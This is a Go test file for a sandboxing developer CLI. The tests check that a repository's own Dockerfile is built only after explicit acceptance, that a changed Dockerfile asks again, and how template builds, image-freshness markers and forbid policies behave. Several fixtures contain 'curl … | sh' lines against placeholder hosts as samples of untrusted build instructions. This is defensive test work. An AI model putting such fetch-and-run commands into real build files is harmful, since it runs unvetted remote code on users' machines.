package cli

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mwing/isolated-dev/internal/config"
	"github.com/mwing/isolated-dev/internal/project"
	"github.com/mwing/isolated-dev/internal/runner"
)

// writeDockerfile gives the project its own build instructions.
func writeDockerfile(t *testing.T, h *harness, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(h.paths.ProjectDir, "Dockerfile"),
		[]byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
}

// A build runs the repository's instructions over an ordinary network,
// before the sandbox exists. `dev run` means "run this safely" to the
// person typing it, and that is the one moment where it does not.
func TestARepositoryDockerfileIsNotBuiltUntilAccepted(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	writeDockerfile(t, h, "FROM alpine\nRUN curl https://wherever.example | sh\n")

	err := h.run(t, "run", "--tty", "off", "-c", "true")
	if err == nil {
		t.Fatal("a repository's own Dockerfile was built without being accepted")
	}
	for _, args := range h.dockerArgs() {
		if len(args) > 0 && args[0] == "build" {
			t.Fatalf("a build ran anyway:\n%s", argv(args))
		}
	}
	out := h.stderr.String()
	for _, want := range []string{"Dockerfile", "not", "filtered", "dev accept"} {
		if !strings.Contains(out, want) {
			t.Fatalf("the refusal does not explain itself (missing %q):\n%s", want, out)
		}
	}
}

// Accepting is per file: this is the mechanism the other settings already
// use, so a Dockerfile that changes is new instructions and asks again.
func TestAnAcceptedDockerfileBuilds(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	writeDockerfile(t, h, "FROM alpine\n")

	if err := h.run(t, "accept", "--all"); err != nil {
		t.Fatalf("accept: %v", err)
	}
	h.stderr.Reset()
	if err := h.run(t, "run", "--tty", "off", "-c", "true"); err != nil {
		t.Fatalf("run after accepting: %v\n%s", err, h.stderr.String())
	}

	var built bool
	for _, args := range h.dockerArgs() {
		if len(args) > 0 && args[0] == "build" {
			built = true
		}
	}
	if !built {
		t.Fatal("an accepted Dockerfile was still not built")
	}
}

// Changed instructions are a new request. The acceptance carries a digest
// so the existing value-sensitivity does this without new machinery.
func TestAChangedDockerfileAsksAgain(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	writeDockerfile(t, h, "FROM alpine\n")
	if err := h.run(t, "accept", "--all"); err != nil {
		t.Fatal(err)
	}

	writeDockerfile(t, h, "FROM alpine\nRUN curl https://elsewhere.example | sh\n")
	if err := h.run(t, "run", "--tty", "off", "-c", "true"); err == nil {
		t.Fatal("a Dockerfile that changed after acceptance was built without asking")
	}
}

// The review's finding: the digest made the consent look tighter than it
// is. A Dockerfile that copies the directory in and runs a script from it
// has the build context as part of its program, and the context changes on
// every save — so what is accepted is the repository supplying build
// instructions, and the prompt has to say that rather than implying one
// pinned file.
func TestBuildConsentDoesNotOverstateWhatItPins(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	writeDockerfile(t, h, "FROM alpine\nCOPY . .\nRUN ./build.sh\n")

	_ = h.run(t, "run", "--tty", "off", "-c", "true")

	out := h.stderr.String()
	if !strings.Contains(out, "anything it runs from this") {
		t.Errorf("the prompt does not say the context is included:\n%s", out)
	}
}

// And the honest limit, stated as a test so it cannot quietly become a
// claim: a change to what the Dockerfile runs does not ask again. Only the
// file does. Hashing the context would re-ask on every edit, and a prompt
// that fires constantly is one that gets accepted unread.
func TestChangingTheBuildScriptDoesNotAskAgain(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	writeDockerfile(t, h, "FROM alpine\nCOPY . .\nRUN ./build.sh\n")
	script := filepath.Join(h.paths.ProjectDir, "build.sh")
	if err := os.WriteFile(script, []byte("#!/bin/sh\necho hello\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := h.run(t, "accept", "--all"); err != nil {
		t.Fatal(err)
	}

	if err := os.WriteFile(script, []byte("#!/bin/sh\ncurl https://elsewhere.example | sh\n"),
		0o755); err != nil {
		t.Fatal(err)
	}
	h.stderr.Reset()
	if err := h.run(t, "run", "--tty", "off", "-c", "true"); err != nil {
		t.Fatalf("build refused: %v\n%s", err, h.stderr.String())
	}
}

// Choosing the template narrows what runs rather than widening it, so it
// needs no acceptance: someone inspecting an unfamiliar repository should
// not have to accept its Dockerfile in order to avoid building it.
func TestTheTemplateCanBeChosenWithoutAccepting(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	h.writeLanguage(t, "demo", `name: demo
versions: ["1"]
detection:
  files: [demo.toml]
`)
	if err := os.WriteFile(filepath.Join(h.paths.ProjectDir, "demo.toml"),
		[]byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	writeDockerfile(t, h, "FROM alpine\nRUN curl https://wherever.example | sh\n")

	if err := h.run(t, "run", "--build-source", "template", "--tty", "off", "-c", "true"); err != nil {
		t.Fatalf("choosing the template was refused: %v\n%s", err, h.stderr.String())
	}
}

// A project with no Dockerfile of its own asks nothing: the template is
// this tool's file, and nothing about it is the repository's request.
func TestATemplateOnlyProjectNeedsNoBuildConsent(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	h.writeLanguage(t, "demo", `name: demo
versions: ["1"]
detection:
  files: [demo.toml]
`)
	if err := os.WriteFile(filepath.Join(h.paths.ProjectDir, "demo.toml"),
		[]byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := h.run(t, "run", "--tty", "off", "-c", "true"); err != nil {
		t.Fatalf("a template-only project asked for consent: %v\n%s", err, h.stderr.String())
	}
}

// Found by running the release candidate against a real project:
// `whoami: cannot find name for user ID 501`, on a machine where the fix
// that gives every image an account had shipped. The image tag is derived
// from the project name and the host uid, so an image built by an older
// version of the tool sits under the same name and is reused forever — a
// fix that never reaches an existing project is not a fix.
//
// The sidecar already had this problem and this answer, where the stakes
// were higher: an image predating a bypass fix called itself filtered.
func TestAnImageBuiltFromOtherInstructionsIsRebuilt(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	writeDockerfile(t, h, "FROM alpine\n")
	if err := h.run(t, "accept", "--all"); err != nil {
		t.Fatal(err)
	}
	// The image is present, and carries a marker from instructions that are
	// not these.
	h.fake.Response[dockerKey("image", "inspect", "--format",
		fmt.Sprintf("{{index .Config.Labels %q}}", imageSourceLabel))] =
		runner.Result{Stdout: "0000000000000000\n"}

	if err := h.run(t, "run", "--tty", "off", "-c", "true"); err != nil {
		t.Fatalf("run: %v\n%s", err, h.stderr.String())
	}

	var built bool
	for _, args := range h.dockerArgs() {
		if len(args) > 0 && args[0] == "build" && strings.Contains(argv(args), "dev-img-") {
			built = true
		}
	}
	if !built {
		t.Errorf("a stale image was reused:\n%s", h.stderr.String())
	}
	if !strings.Contains(h.stderr.String(), "different instructions") {
		t.Errorf("the rebuild was not explained:\n%s", h.stderr.String())
	}
}

// And the other direction, or the marker would mean a rebuild on every
// run: an image whose marker matches is used as it is.
func TestAnImageBuiltFromTheseInstructionsIsReused(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	writeDockerfile(t, h, "FROM alpine\n")
	if err := h.run(t, "accept", "--all"); err != nil {
		t.Fatal(err)
	}
	cfg, p, err := resolveProject(h.env)
	if err != nil {
		t.Fatal(err)
	}
	want, err := finalDockerfile(cfg, p)
	if err != nil {
		t.Fatal(err)
	}
	h.fake.Response[dockerKey("image", "inspect", "--format",
		fmt.Sprintf("{{index .Config.Labels %q}}", imageSourceLabel))] =
		runner.Result{Stdout: sourceMarker(want) + "\n"}

	h.stderr.Reset()
	if err := h.run(t, "run", "--tty", "off", "-c", "true"); err != nil {
		t.Fatalf("run: %v\n%s", err, h.stderr.String())
	}
	for _, args := range h.dockerArgs() {
		if len(args) > 0 && args[0] == "build" && strings.Contains(argv(args), "dev-img-") {
			t.Errorf("a current image was rebuilt anyway:\n%s", argv(args))
		}
	}
}

func TestBuildSourceTemplateCanBeConfigured(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	h.writeLanguage(t, "demo", "name: demo\nversions: [\"1\"]\ndetection:\n  files: [demo.toml]\n")
	if err := os.WriteFile(filepath.Join(h.paths.ProjectDir, "demo.toml"), []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	writeDockerfile(t, h, "FROM alpine\nRUN echo production\n")
	h.writeProject(t, "build_source: template\n")

	if err := h.run(t, "run", "--tty", "off", "-c", "true"); err != nil {
		t.Fatalf("a configured template still demanded consent: %v\n%s", err, h.stderr.String())
	}
	if strings.Contains(h.stdout.String(), "Dockerfile: "+filepath.Join(h.paths.ProjectDir, "Dockerfile")) {
		t.Errorf("the project's own Dockerfile was built anyway:\n%s", h.stdout.String())
	}
}

// Configuration may narrow what runs, never widen it.
func TestBuildSourceProjectIsRefusedFromConfig(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	writeDockerfile(t, h, "FROM alpine\n")
	h.writeProject(t, "build_source: project\n")

	err := h.run(t, "run", "--tty", "off", "-c", "true")
	if err == nil {
		t.Fatal("a project file granted itself the build consent")
	}
	if !strings.Contains(err.Error(), "dev accept") {
		t.Errorf("the refusal does not name the real way to record it: %v", err)
	}
}

func TestBuildCommandTakesBuildSource(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.writeLanguage(t, "demo", "name: demo\nversions: [\"1\"]\ndetection:\n  files: [demo.toml]\n")
	if err := os.WriteFile(filepath.Join(h.paths.ProjectDir, "demo.toml"), []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	writeDockerfile(t, h, "FROM alpine\nRUN echo production\n")

	if err := h.run(t, "build", "--build-source", "template"); err != nil {
		t.Fatalf("dev build --build-source template: %v\n%s", err, h.stderr.String())
	}
	if !strings.Contains(h.stdout.String(), "language template") {
		t.Errorf("dev build did not use the template:\n%s", h.stdout.String())
	}
}

// The flag wins over configuration at every layer. buildImageWith used to
// re-derive the choice with no knowledge of the flag, so a run could be
// told one thing and build another.
func TestAnExplicitFlagBeatsTheConfiguredBuildSource(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	h.writeLanguage(t, "demo", "name: demo\nversions: [\"1\"]\ndetection:\n  files: [demo.toml]\n")
	if err := os.WriteFile(filepath.Join(h.paths.ProjectDir, "demo.toml"), []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	writeDockerfile(t, h, "FROM alpine\n")

	// Configured to refuse; the flag must still rescue the run.
	h.writeProject(t, "build_source: project\n")
	if err := h.run(t, "build", "--build-source", "template"); err != nil {
		t.Fatalf("--build-source template did not override build_source: project: %v\n%s",
			err, h.stderr.String())
	}
	if !strings.Contains(h.stdout.String(), "language template") {
		t.Errorf("the flag did not select the template:\n%s", h.stdout.String())
	}
}

// The marker distinguishing a configured template from a flagged one is
// internal; typing it must not reach that branch.
func TestTheConfigSentinelIsNotAValidFlag(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	writeDockerfile(t, h, "FROM alpine\n")

	err := h.run(t, "build", "--build-source", configuredTemplate)
	if err == nil {
		t.Fatal("the internal marker was accepted as a flag value")
	}
	if !strings.Contains(err.Error(), "unknown --build-source") {
		t.Errorf("the refusal does not read as a bad flag value: %v", err)
	}
}

func templateProject(t *testing.T, h *harness) {
	t.Helper()
	gitProject(t, h)
	for name, body := range map[string]string{
		"Dockerfile":   "FROM gcr.io/distroless/nodejs22\n",
		"package.json": `{"name":"app"}` + "\n",
	} {
		if err := os.WriteFile(filepath.Join(h.paths.ProjectDir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	h.writeProject(t, "build_source: template\n")
}

// The consent gate runs before the build, so the template has to be applied
// before it: asked about a Dockerfile the run will never read, the gate
// blocks the project for following its own advice.
func TestAConfiguredTemplateIsBuiltWithoutDockerfileConsent(t *testing.T) {
	for _, args := range [][]string{
		{"console", "--agent", "claude", "--in-place"},
		{"agent", "run", "claude", "--in-place", "--tty", "off"},
	} {
		h := newHarness(t)
		h.readyBackend()
		h.readySidecar()
		templateProject(t, h)
		_, p, err := resolveProject(h.env)
		if err != nil {
			t.Fatal(err)
		}
		h.fake.Response[dockerKey("image", "inspect", p.Image)] = runner.Result{ExitCode: 1}

		err = h.run(t, args...)
		if err != nil && strings.Contains(err.Error(), "unaccepted project settings") {
			t.Errorf("%v: asked to trust a Dockerfile the template ignores:\n%s", args, h.stderr.String())
			continue
		}
		out := h.stdout.String() + h.stderr.String()
		if !strings.Contains(out, "language template") {
			t.Errorf("%v: the template was not what got built:\n%s", args, out)
		}
	}
}

// Configuration may narrow the build, and must not stand in for consent when
// a flag widens it again.
func TestAnExplicitProjectBuildStillNeedsConsent(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	templateProject(t, h)

	err := h.run(t, "run", "--build-source", "project", "-c", "true")
	if err == nil || !strings.Contains(err.Error(), "not been accepted") && !strings.Contains(err.Error(), "unaccepted") {
		t.Fatalf("an unaccepted Dockerfile was built because the config chose the template: %v\n%s",
			err, h.stderr.String())
	}
}

// The freshness check must compare against the Dockerfile the run builds, not
// the repo's; otherwise a template image never matches and every agent run
// rebuilds it. The repo Dockerfile is accepted so consent cannot be what stops
// the run.
func freshnessRun(t *testing.T, label func(cfg config.Config, p *project.Project) string) string {
	t.Helper()
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	templateProject(t, h)
	cfg, p, err := resolveProject(h.env)
	if err != nil {
		t.Fatal(err)
	}
	h.acceptSettings(t, *buildSourceAsk(p))
	h.fake.Response[dockerKey("image", "inspect", "--format",
		fmt.Sprintf("{{index .Config.Labels %q}}", imageSourceLabel), p.Image)] =
		runner.Result{Stdout: label(cfg, p) + "\n"}

	if err := h.run(t, "agent", "run", "claude", "--in-place", "--tty", "off"); err != nil {
		t.Fatalf("agent run: %v\n%s", err, h.stderr.String())
	}
	return h.stdout.String() + h.stderr.String()
}

func TestATemplateImageIsNotRebuiltEveryRun(t *testing.T) {
	out := freshnessRun(t, func(cfg config.Config, p *project.Project) string {
		tp := *p
		tp.UseTemplate()
		want, err := finalDockerfile(cfg, &tp)
		if err != nil {
			t.Fatal(err)
		}
		return sourceMarker(want)
	})
	if strings.Contains(out, "Rebuilding ") && strings.Contains(out, "different instructions than this project") {
		t.Errorf("a current template image was rebuilt:\n%s", out)
	}
}

func TestARepoDockerfileImageIsRebuiltFromTheTemplate(t *testing.T) {
	out := freshnessRun(t, func(cfg config.Config, p *project.Project) string {
		want, err := finalDockerfile(cfg, p)
		if err != nil {
			t.Fatal(err)
		}
		return sourceMarker(want)
	})
	if !strings.Contains(out, "language template") {
		t.Errorf("an image from the repo Dockerfile was reused under a configured template:\n%s", out)
	}
}

// A directory with nothing to detect has no template to switch to, and an
// agent there runs on its own base image; configuring the template must not
// make that an error.
func TestAConfiguredTemplateWithNoLanguageStillRunsAnAgent(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	gitProject(t, h)
	h.writeProject(t, "build_source: template\n")

	if err := h.run(t, "agent", "run", "claude", "--in-place", "--tty", "off"); err != nil {
		t.Fatalf("an agent in a directory with no language failed: %v\n%s", err, h.stderr.String())
	}
}

// `dev run --build-source project` points at `dev accept`; with the template
// configured, accept must still be able to record the Dockerfile.
func TestAcceptCanRecordTheDockerfileUnderAConfiguredTemplate(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	h.readySidecar()
	templateProject(t, h)

	if err := h.run(t, "accept", "build_source"); err != nil {
		t.Fatalf("accept: %v\n%s", err, h.stderr.String())
	}
	err := h.run(t, "run", "--build-source", "project", "-c", "true")
	if err != nil && strings.Contains(err.Error(), "unaccepted") {
		t.Errorf("accepting did not satisfy --build-source project: %v\n%s", err, h.stderr.String())
	}
}

// Policy outranks an acceptance recorded before the rule, and `dev build`
// never reaches enforceConsent, where it is otherwise checked.
func TestABuildHonoursForbidBuildSourceAfterAcceptance(t *testing.T) {
	for _, args := range [][]string{
		{"build"},
		{"build", "--build-source", "project"},
	} {
		h := newHarness(t)
		h.readyBackend()
		if err := os.WriteFile(filepath.Join(h.paths.ProjectDir, "Dockerfile"),
			[]byte("FROM alpine\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		_, p, err := resolveProject(h.env)
		if err != nil {
			t.Fatal(err)
		}
		h.acceptSettings(t, *buildSourceAsk(p))
		h.writePolicy(t, "forbid: [build_source]\n")

		err = h.run(t, args...)
		if err == nil || !strings.Contains(err.Error(), "build_source") {
			t.Errorf("%v: built a Dockerfile the machine forbids: %v", args, err)
		}
		for _, run := range h.dockerArgs() {
			if len(run) > 0 && run[0] == "build" {
				t.Errorf("%v: a build was started: %v", args, run)
			}
		}
	}
}

// The policy forbids the repository's Dockerfile, not building: the template
// still has to work under it.
func TestATemplateBuildIsNotForbiddenByBuildSourcePolicy(t *testing.T) {
	h := newHarness(t)
	h.readyBackend()
	templateProject(t, h)
	h.writePolicy(t, "forbid: [build_source]\n")

	if err := h.run(t, "build", "--build-source", "template"); err != nil {
		t.Fatalf("a template build was refused under forbid: build_source: %v\n%s", err, h.stderr.String())
	}
}
